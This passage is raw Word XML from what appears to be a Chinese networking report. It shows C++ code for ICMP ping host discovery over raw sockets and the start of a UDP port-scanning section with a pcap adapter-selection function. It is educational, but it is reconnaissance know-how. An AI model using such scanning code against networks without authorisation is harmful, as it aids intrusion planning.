      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D9E087" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>char* some;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DB9237" w14:textId="36CE836E" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">some = inet_ntoa(sockaddrDest.sin_addr); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="408521AC" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>判断是否需要接收相应报文</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E698738" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>if (pPingReply == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="417550FA" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB0544C" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>return TRUE;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="239EBA68" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B61F69C" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>char recvbuf[256] = { "\0" };</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183E7572" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>while (TRUE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2C67CA" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55966DE6" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>接收响应报文</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0702EF45" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>if (WSAWaitForMultipleEvents(1, &amp;m_event, FALSE, 100, FALSE) != WSA_WAIT_TIMEOUT)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A1CDF6" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58670A11" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>WSANETWORKEVENTS netEvent;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03FA14C2" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRPr="00587D4E" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>WSAEnumNetworkEvents(m_sockRaw, m_event, &amp;netEvent);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFAFD24" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>if (netEvent.lNetworkEvents &amp; FD_READ)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56CE1D6D" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4BC626" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>ULONG nRecvTimestamp = GetTickCountCalibrate();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41FD7AB1" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>int nPacketSize = recvfrom(m_sockRaw, recvbuf, 256, 0, (struct sockaddr*)&amp;sockaddrDest, &amp;nSockaddrDestSize);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3458BECE" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>if (nPacketSize != SOCKET_ERROR)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9CAAE5" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5454E6A9" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>IPHeader *pIPHeader = (IPHeader*)recvbuf;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5821C892" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>USHORT usIPHeaderLen = (USHORT)((pIPHeader-&gt;m_byVerHLen &amp; 0x0f) * 4);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23186773" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>ICMPHeader *pICMPHeader = (ICMPHeader*)(recvbuf + usIPHeaderLen);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A457B85" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56A087DD"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67890E83"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0FFEA0A4" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"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36658061" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EFAEA0B" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF19BE9" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>existHostMap[some] = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F7137D" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>cout &lt;&lt; some &lt;&lt; "</w:t>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>ping success!" &lt;&lt; endl;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB34DB8" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>pPingReply-&gt;m_usSeq = usSeq;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB9653C" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>pPingReply-&gt;m_dwRoundTripTime = nRecvTimestamp - pICMPHeader-&gt;m_ulTimeStamp;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166D7D06" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>pPingReply-&gt;m_dwBytes = nPacketSize - usIPHeaderLen - sizeof(ICMPHeader);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01621AF0" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>pPingReply-&gt;m_dwTTL = pIPHeader-&gt;m_byTTL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB00ECE" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>return TRUE;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C34AF5C" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C381615" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB3E18E" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E0F670" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325B13DC" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>超时</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B15AB59" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>if (GetTickCountCalibrate() - ulSendTimestamp &gt;= dwTimeout)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395B59A9" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008B8AA1" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>cout &lt;&lt; some &lt;&lt; "</w:t>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>timeout" &lt;&lt; endl;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0451FAFD" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>return FALSE;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58166DBD" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7CC8FA" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537AF804" w14:textId="2702FA87" w:rsidR="002C55A5" w:rsidRPr="002C55A5" w:rsidRDefault="002C55A5" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A79EFA" w14:textId="668D43EF" w:rsidR="0061401E" w:rsidRPr="00E90326" w:rsidRDefault="000656A3" w:rsidP="0061401E">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1111" w:name="_Toc482522650"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>UDP</w:t>
      </w:r>
      <w:r w:rsidR="0094103A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>端口扫描</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1111"/>
    </w:p>
    <w:p w14:paraId="2A8AAC2C" w14:textId="48CFF43F"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1112" w:name="_Toc482141257"/>
      <w:bookmarkStart w:id="1113" w:name="_Toc482141930"/>
      <w:bookmarkStart w:id="1114" w:name="_Toc482522651"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>网卡选择</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1112"/>
      <w:bookmarkEnd w:id="1113"/>
      <w:bookmarkEnd w:id="1114"/>
    </w:p>
    <w:p w14:paraId="24FBD52D" w14:textId="68147529" w:rsidR="0061401E" w:rsidRPr="00062F96" w:rsidRDefault="00062F96" w:rsidP="00062F96">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>网卡选择函数，参数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6C2DD3DF" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>void getChoicedDevice(int chosen) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3525F884" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>int i = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CBBA604" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>char Error[PCAP_ERRBUF_SIZE];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15DC9490" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &amp;ChosenDevice, Error);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3C1920" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>for (pcap_if_t* CurrentDevice = ChosenDevice; CurrentDevice != NULL; CurrentDevice = CurrentDevice-&gt;next)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E9CBF08" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E599103" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>if (i == chosen)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D1D0AB7" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E30D42A" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>ChosenDevice = CurrentDevice;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42482640" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F03AAB" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F078EA8" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>i++;</w:t>
      </w:r>
    </w:p>
